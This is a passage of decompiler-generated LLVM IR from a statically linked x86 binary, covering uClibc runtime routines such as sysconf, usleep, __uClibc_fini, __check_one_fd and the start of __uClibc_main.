  store i32 %v4_8054faf, i32* %eax.global-to-local, align 4
  %v0_8054fb4 = load i32, i32* @esi, align 4
  %v1_8054fb4 = load i32, i32* @ebx, align 4
  %v2_8054fb4 = inttoptr i32 %v1_8054fb4 to i32*
  store i32 %v0_8054fb4, i32* %v2_8054fb4, align 4
  %v0_8054fde.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054fdb

dec_label_pc_8054fb8:                             ; preds = %dec_label_pc_8054f7e
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054fbe = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054fbe = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054fbe, i32 0)
  store i32 %v4_8054fbe, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054fd4

dec_label_pc_8054fc9:                             ; preds = %dec_label_pc_8054efb
  %v2_8054fcb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054fcb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054fd4

dec_label_pc_8054fd4:                             ; preds = %dec_label_pc_8054fb8, %dec_label_pc_8054fc9
  %storemerge3.pre-phi = phi i32 [ %v2_8054f8a, %dec_label_pc_8054fb8 ], [ %v2_8054fcb, %dec_label_pc_8054fc9 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8054fd4 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054fd4 = call i32 @__libc_nanosleep(%timespec* %v2_8054fd4, i32 %storemerge3.pre-phi)
  store i32 %v3_8054fd4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054fdb

dec_label_pc_8054fdb:                             ; preds = %dec_label_pc_8054f93, %dec_label_pc_8054fd4
  %v0_8054fde = phi i32 [ %v0_8054fde.pre, %dec_label_pc_8054f93 ], [ %v3_8054fd4, %dec_label_pc_8054fd4 ]
  %v1_8054fde = icmp eq i32 %v0_8054fde, 0
  br i1 %v1_8054fde, label %dec_label_pc_8054ffb, label %dec_label_pc_8054fe2

dec_label_pc_8054fe2:                             ; preds = %dec_label_pc_8054fdb
  %v4_8054ff2 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8054ff2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055002

dec_label_pc_8054ffb:                             ; preds = %entry, %dec_label_pc_8054fdb
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055002

dec_label_pc_8054fff:                             ; preds = %dec_label_pc_8054f24, %dec_label_pc_8054edf, %dec_label_pc_8054eb1
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055002

dec_label_pc_8055002:                             ; preds = %dec_label_pc_8054f56, %dec_label_pc_8054ffb, %dec_label_pc_8054fe2, %dec_label_pc_8054fff
  %v0_805500c = phi i32 [ %v0_805500c.pre, %dec_label_pc_8054f56 ], [ 0, %dec_label_pc_8054ffb ], [ %v4_8054ff2, %dec_label_pc_8054fe2 ], [ -1, %dec_label_pc_8054fff ]
  store i32 %v0_8054e8c, i32* @ebx, align 4
  store i32 %v0_8054e8b, i32* @esi, align 4
  store i32 %v0_8054e8a, i32* @edi, align 4
  ret i32 %v0_805500c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8054f9e, { 1, 0, 2 }
  uselistorder i32 %v2_8054f8a, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8054f21, { 2, 1, 0 }
  uselistorder i32 %v2_8054ee0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8054ec7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8054eae, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 0, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 14 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 2, 3, 0, 1, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055002, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8054fdb, { 1, 0 }
  uselistorder label %dec_label_pc_8054fd4, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805502f [
    i32 0, label %dec_label_pc_805503f
    i32 1, label %dec_label_pc_8055124
    i32 2, label %dec_label_pc_8055049
    i32 3, label %dec_label_pc_8055053
    i32 4, label %dec_label_pc_805505d
    i32 5, label %dec_label_pc_80550f3
    i32 6, label %dec_label_pc_8055065
    i32 7, label %dec_label_pc_8055025
    i32 8, label %dec_label_pc_8055025
    i32 9, label %dec_label_pc_8055025
    i32 10, label %dec_label_pc_8055025
    i32 11, label %dec_label_pc_8055025
    i32 12, label %dec_label_pc_8055025
    i32 13, label %dec_label_pc_8055025
    i32 14, label %dec_label_pc_8055025
    i32 15, label %dec_label_pc_8055025
    i32 16, label %dec_label_pc_8055025
    i32 17, label %dec_label_pc_8055025
    i32 18, label %dec_label_pc_8055025
    i32 19, label %dec_label_pc_8055025
    i32 20, label %dec_label_pc_8055025
    i32 21, label %dec_label_pc_8055025
    i32 22, label %dec_label_pc_8055025
    i32 23, label %dec_label_pc_8055124
    i32 24, label %dec_label_pc_8055124
    i32 25, label %dec_label_pc_8055130
    i32 26, label %dec_label_pc_8055101
    i32 27, label %dec_label_pc_8055124
    i32 28, label %dec_label_pc_8055077
    i32 29, label %dec_label_pc_80550fa
    i32 30, label %dec_label_pc_805506f
    i32 31, label %dec_label_pc_805510f
    i32 32, label %dec_label_pc_8055124
    i32 33, label %dec_label_pc_8055124
    i32 34, label %dec_label_pc_8055124
    i32 35, label %dec_label_pc_8055108
    i32 36, label %dec_label_pc_8055137
    i32 37, label %dec_label_pc_805513e
    i32 38, label %dec_label_pc_8055137
    i32 39, label %dec_label_pc_8055081
    i32 40, label %dec_label_pc_8055145
    i32 41, label %dec_label_pc_8055124
    i32 42, label %dec_label_pc_805510f
    i32 43, label %dec_label_pc_805513e
    i32 44, label %dec_label_pc_805514c
    i32 45, label %dec_label_pc_805513e
    i32 46, label %dec_label_pc_80550fa
    i32 47, label %dec_label_pc_80550fa
    i32 48, label %dec_label_pc_80550fa
    i32 49, label %dec_label_pc_8055124
    i32 50, label %dec_label_pc_8055124
    i32 51, label %dec_label_pc_80550fa
    i32 52, label %dec_label_pc_80550fa
    i32 53, label %dec_label_pc_8055124
    i32 54, label %dec_label_pc_8055124
    i32 55, label %dec_label_pc_8055124
    i32 56, label %dec_label_pc_8055124
    i32 57, label %dec_label_pc_8055124
    i32 58, label %dec_label_pc_8055124
    i32 59, label %dec_label_pc_8055124
    i32 60, label %dec_label_pc_8055124
    i32 61, label %dec_label_pc_8055124
    i32 62, label %dec_label_pc_8055124
    i32 63, label %dec_label_pc_8055124
    i32 64, label %dec_label_pc_8055124
    i32 65, label %dec_label_pc_8055124
    i32 66, label %dec_label_pc_8055124
    i32 67, label %dec_label_pc_8055025
    i32 68, label %dec_label_pc_8055025
    i32 69, label %dec_label_pc_8055108
    i32 70, label %dec_label_pc_8055108
    i32 71, label %dec_label_pc_8055108
    i32 72, label %dec_label_pc_805510f
    i32 73, label %dec_label_pc_8055116
    i32 74, label %dec_label_pc_805511d
    i32 75, label %dec_label_pc_805508b
    i32 76, label %dec_label_pc_805511d
    i32 77, label %dec_label_pc_8055025
    i32 78, label %dec_label_pc_8055025
    i32 79, label %dec_label_pc_8055025
    i32 80, label %dec_label_pc_8055025
    i32 81, label %dec_label_pc_8055025
    i32 82, label %dec_label_pc_8055025
    i32 83, label %dec_label_pc_8055025
    i32 84, label %dec_label_pc_8055025
    i32 85, label %dec_label_pc_8055124
    i32 86, label %dec_label_pc_8055124
    i32 87, label %dec_label_pc_8055101
    i32 88, label %dec_label_pc_8055095
    i32 89, label %dec_label_pc_805509f
    i32 90, label %dec_label_pc_8055116
    i32 91, label %dec_label_pc_8055025
    i32 92, label %dec_label_pc_8055025
    i32 93, label %dec_label_pc_8055025
    i32 94, label %dec_label_pc_8055025
    i32 95, label %dec_label_pc_80550fa
    i32 96, label %dec_label_pc_8055124
    i32 97, label %dec_label_pc_8055124
    i32 98, label %dec_label_pc_8055025
    i32 99, label %dec_label_pc_8055025
    i32 100, label %dec_label_pc_8055025
    i32 101, label %dec_label_pc_80550a9
    i32 102, label %dec_label_pc_80550ec
    i32 103, label %dec_label_pc_8055129
    i32 104, label %dec_label_pc_8055101
    i32 105, label %dec_label_pc_80550b3
    i32 106, label %dec_label_pc_805510f
    i32 107, label %dec_label_pc_805510f
    i32 108, label %dec_label_pc_80550f3
    i32 109, label %dec_label_pc_8055130
    i32 110, label %dec_label_pc_805514c
    i32 111, label %dec_label_pc_80550ec
    i32 112, label %dec_label_pc_8055129
    i32 113, label %dec_label_pc_805514c
    i32 114, label %dec_label_pc_80550bd
    i32 115, label %dec_label_pc_8055145
    i32 116, label %dec_label_pc_8055124
    i32 117, label %dec_label_pc_8055124
    i32 118, label %dec_label_pc_80550c7
    i32 119, label %dec_label_pc_80550d1
    i32 120, label %dec_label_pc_805513e
    i32 121, label %dec_label_pc_8055101
    i32 122, label %dec_label_pc_8055101
    i32 123, label %dec_label_pc_8055101
    i32 124, label %dec_label_pc_8055101
    i32 125, label %dec_label_pc_8055025
    i32 126, label %dec_label_pc_8055025
    i32 127, label %dec_label_pc_8055124
    i32 128, label %dec_label_pc_8055124
    i32 129, label %dec_label_pc_8055025
    i32 130, label %dec_label_pc_8055025
    i32 131, label %dec_label_pc_8055124
    i32 149, label %dec_label_pc_80550d8
  ]

dec_label_pc_8055025:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_805502f:                             ; preds = %entry
  %v1_805502f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8055034 = inttoptr i32 %v1_805502f to i32*
  store i32 22, i32* %v1_8055034, align 4
  br label %dec_label_pc_8055124

dec_label_pc_805503f:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055049:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055053:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_805505d:                             ; preds = %entry
  %v0_8055060 = call i32 @getdtablesize()
  br label %dec_label_pc_8055065

dec_label_pc_8055065:                             ; preds = %entry, %dec_label_pc_805505d
  br label %dec_label_pc_8055151

dec_label_pc_805506f:                             ; preds = %entry
  %v3_8055072 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8055077

dec_label_pc_8055077:                             ; preds = %entry, %dec_label_pc_805506f
  br label %dec_label_pc_8055151

dec_label_pc_8055081:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_805508b:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055095:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_805509f:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550a9:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550b3:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550bd:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550c7:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550d1:                             ; preds = %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550d8:                             ; preds = %entry
  %v5_80550de = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80550e6 = icmp slt i32 %v5_80550de, 0
  %v1_80550e8 = icmp eq i1 %v2_80550e6, false
  br i1 %v1_80550e8, label %dec_label_pc_80550fa, label %dec_label_pc_8055124

dec_label_pc_80550ec:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550f3:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_80550fa:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80550d8
  br label %dec_label_pc_8055151

dec_label_pc_8055101:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055108:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_805510f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055116:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_805511d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055124:                             ; preds = %dec_label_pc_80550d8, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805502f
  br label %dec_label_pc_8055151

dec_label_pc_8055129:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055130:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055137:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_805513e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055145:                             ; preds = %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_805514c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8055151

dec_label_pc_8055151:                             ; preds = %dec_label_pc_8055145, %dec_label_pc_805513e, %dec_label_pc_8055137, %dec_label_pc_8055130, %dec_label_pc_8055129, %dec_label_pc_805511d, %dec_label_pc_8055116, %dec_label_pc_805510f, %dec_label_pc_8055108, %dec_label_pc_8055101, %dec_label_pc_80550f3, %dec_label_pc_80550ec, %dec_label_pc_80550fa, %dec_label_pc_80550d1, %dec_label_pc_80550c7, %dec_label_pc_80550bd, %dec_label_pc_80550b3, %dec_label_pc_80550a9, %dec_label_pc_805509f, %dec_label_pc_8055095, %dec_label_pc_805508b, %dec_label_pc_8055081, %dec_label_pc_8055077, %dec_label_pc_8055065, %dec_label_pc_8055053, %dec_label_pc_8055049, %dec_label_pc_805503f, %dec_label_pc_8055025, %dec_label_pc_8055124, %dec_label_pc_805514c
  %v0_8055154 = phi i32 [ 255, %dec_label_pc_8055145 ], [ 2048, %dec_label_pc_805513e ], [ 99, %dec_label_pc_8055137 ], [ 20, %dec_label_pc_8055130 ], [ -128, %dec_label_pc_8055129 ], [ 1024, %dec_label_pc_805511d ], [ 4, %dec_label_pc_8055116 ], [ 32, %dec_label_pc_805510f ], [ 256, %dec_label_pc_8055108 ], [ 2147483647, %dec_label_pc_8055101 ], [ 16, %dec_label_pc_80550f3 ], [ 127, %dec_label_pc_80550ec ], [ 200112, %dec_label_pc_80550fa ], [ 9, %dec_label_pc_80550d1 ], [ 65535, %dec_label_pc_80550c7 ], [ -32768, %dec_label_pc_80550bd ], [ -2147483648, %dec_label_pc_80550b3 ], [ 8, %dec_label_pc_80550a9 ], [ 500, %dec_label_pc_805509f ], [ 4096, %dec_label_pc_8055095 ], [ 16384, %dec_label_pc_805508b ], [ 1000, %dec_label_pc_8055081 ], [ 32768, %dec_label_pc_8055077 ], [ 6, %dec_label_pc_8055065 ], [ 65536, %dec_label_pc_8055053 ], [ 100, %dec_label_pc_8055049 ], [ 131072, %dec_label_pc_805503f ], [ 1, %dec_label_pc_8055025 ], [ -1, %dec_label_pc_8055124 ], [ 32767, %dec_label_pc_805514c ]
  ret i32 %v0_8055154

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 2, 0, 1 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 3, 1, 2, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 8, 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 0, 1 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 2, 1, 3, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_8055151, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8055124, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80550fa, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8055077, { 1, 0 }
  uselistorder label %dec_label_pc_8055065, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8055160 = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_8055160, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_805517f = bitcast i32* %stack_var_-8 to %timespec*
  %v3_805517f = call i32 @__libc_nanosleep(%timespec* %v2_805517f, i32 0)
  ret i32 %v3_805517f

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 1, 2, 0 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055188 = load i32, i32* @ebx, align 4
  store i32 %v0_8055188, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 0), label %dec_label_pc_805519c, label %dec_label_pc_80551a9

dec_label_pc_805519c:                             ; preds = %entry, %dec_label_pc_805519c
  %v1_80551a36 = phi i32 [ %v1_80551a3, %dec_label_pc_805519c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80551a3.539 to i32), i32* %stack_var_-16, align 4
  %v5_805519c = mul i32 %v1_80551a36, 4
  %v6_805519c = add i32 %v5_805519c, ptrtoint (i32* @global_var_805c000.538 to i32)
  %v7_805519c = inttoptr i32 %v6_805519c to i32*
  %v8_805519c = load i32, i32* %v7_805519c, align 4
  call void @__pseudo_call(i32 %v8_805519c)
  %v0_80551a3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80551a3 = add i32 %v0_80551a3.pre, -1
  store i32 %v1_80551a3, i32* %ebx.global-to-local, align 4
  %v10_80551a4 = icmp eq i32 %v0_80551a3.pre, 0
  %v1_80551a7 = icmp eq i1 %v10_80551a4, false
  br i1 %v1_80551a7, label %dec_label_pc_805519c, label %dec_label_pc_80551a9

dec_label_pc_80551a9:                             ; preds = %dec_label_pc_805519c, %entry
  %v0_80551a9 = load i32, i32* @global_var_8062774.540, align 4
  %v1_80551ae = icmp eq i32 %v0_80551a9, 0
  br i1 %v1_80551ae, label %dec_label_pc_80551b4, label %dec_label_pc_80551b2

dec_label_pc_80551b2:                             ; preds = %dec_label_pc_80551a9
  %v0_80551b2 = load i32, i32* %stack_var_-16, align 4
  %v1_80551b2 = call i32 @unknown_0(i32 %v0_80551b2)
  br label %dec_label_pc_80551b4

dec_label_pc_80551b4:                             ; preds = %dec_label_pc_80551b2, %dec_label_pc_80551a9
  %v0_80551b4 = load i32, i32* @global_var_8062778.541, align 8
  %v1_80551ba = icmp eq i32 %v0_80551b4, 0
  br i1 %v1_80551ba, label %dec_label_pc_80551c3, label %dec_label_pc_80551be

dec_label_pc_80551be:                             ; preds = %dec_label_pc_80551b4
  %v2_80551c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80551c0, i32* %ebx.global-to-local, align 4
  %v0_80551c1 = load i32, i32* %stack_var_-16, align 4
  %v1_80551c1 = call i32 @unknown_0(i32 %v0_80551c1)
  br label %dec_label_pc_80551c3

dec_label_pc_80551c3:                             ; preds = %dec_label_pc_80551b4, %dec_label_pc_80551be
  %v2_80551c3 = load i32, i32* %stack_var_-16, align 4
  %v2_80551c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551c4, i32* @edx, align 4
  ret i32 %v2_80551c3

; uselistorder directives
  uselistorder i32 %v1_80551a3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80551c3, { 1, 0 }
  uselistorder label %dec_label_pc_805519c, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80551ca = load i32, i32* @eax, align 4
  ret i32 %v0_80551ca
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80551cb = load i32, i32* @esi, align 4
  %v0_80551cc = load i32, i32* @eax, align 4
  store i32 %v0_80551cc, i32* @esi, align 4
  %v0_80551ce = load i32, i32* @ebx, align 4
  store i32 %v0_80551ce, i32* %stack_var_-8, align 4
  %v0_80551cf = load i32, i32* @edx, align 4
  store i32 %v0_80551cf, i32* @ebx, align 4
  %v4_80551d7 = call i32 @__libc_fcntl(i32 %v0_80551cc, i32 1, i32 %tmp6)
  %v8_80551df = icmp eq i32 %v4_80551d7, -1
  %v1_80551e0 = icmp eq i1 %v8_80551df, false
  br i1 %v1_80551e0, label %dec_label_pc_80551fb, label %dec_label_pc_80551e2

dec_label_pc_80551e2:                             ; preds = %entry
  %v0_80551e4 = load i32, i32* @ebx, align 4
  %v5_80551ea = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b0ec.542, i32 0, i32 0), i32 %v0_80551e4)
  %v1_80551f2 = load i32, i32* @esi, align 4
  %v12_80551f2 = icmp eq i32 %v5_80551ea, %v1_80551f2
  br i1 %v12_80551f2, label %dec_label_pc_80551fb, label %dec_label_pc_80551f6

dec_label_pc_80551f6:                             ; preds = %dec_label_pc_80551e2
  %v0_80551f6 = call i32 @abort()
  br label %dec_label_pc_80551fb

dec_label_pc_80551fb:                             ; preds = %dec_label_pc_80551e2, %entry, %dec_label_pc_80551f6
  %v2_80551fb = load i32, i32* %stack_var_-12, align 4
  %v2_80551fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80551fc, i32* @ebx, align 4
  store i32 %v0_80551cb, i32* @esi, align 4
  ret i32 %v2_80551fb

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_80551fb, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8055202 = load i8, i8* @global_var_806277c.543, align 4
  %v1_8055202 = icmp eq i8 %v0_8055202, 0
  %v1_8055209 = icmp eq i1 %v1_8055202, false
  br i1 %v1_8055209, label %entry.dec_label_pc_805523b_crit_edge, label %dec_label_pc_805520b

entry.dec_label_pc_805523b_crit_edge:             ; preds = %entry
  %v0_805523e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805523b

dec_label_pc_805520b:                             ; preds = %entry
  store i8 1, i8* @global_var_806277c.543, align 4
  store i32 4096, i32* @global_var_8062770.465, align 16
  %v0_8055236 = call i32 @_stdio_init()
  br label %dec_label_pc_805523b

dec_label_pc_805523b:                             ; preds = %entry.dec_label_pc_805523b_crit_edge, %dec_label_pc_805520b
  %v0_805523e = phi i32 [ %v0_805523e.pre, %entry.dec_label_pc_805523b_crit_edge ], [ %v0_8055236, %dec_label_pc_805520b ]
  ret i32 %v0_805523e

; uselistorder directives
  uselistorder i8* @global_var_806277c.543, { 1, 0 }
  uselistorder label %dec_label_pc_805523b, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_805523f = load i32, i32* @ebp, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8062768.544, align 8
  store i32 %arg6, i32* @global_var_8062778.541, align 8
  %v2_8055276 = mul i32 %arg2, 4
  %v3_8055276 = add i32 %tmp29, %v2_8055276
  %v1_8055279 = add i32 %v3_8055276, 4
  store i32 %v1_8055279, i32* %edx.global-to-local, align 4
